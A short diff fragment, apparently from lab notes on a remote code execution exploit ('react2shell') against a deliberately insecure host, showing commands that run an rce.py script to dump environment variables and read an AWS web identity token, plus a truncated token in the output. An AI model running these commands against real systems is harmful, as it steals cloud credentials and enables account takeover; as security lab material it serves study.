@@ -163,7 +163,6 @@ python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "env | 
 
 # get web id
 python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "cat \$AWS_WEB_IDENTITY_TOKEN_FILE"
-executable response:
 # eyJhbGciOiJSUzI1NiIsImtpZCI6IjFhN2U2ZDBiZGY4ODBhNjQ0NGNjYmNlYjZiYWYzNDY4MDA1NDhkOGYiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXh...
 
 # try aws CLI
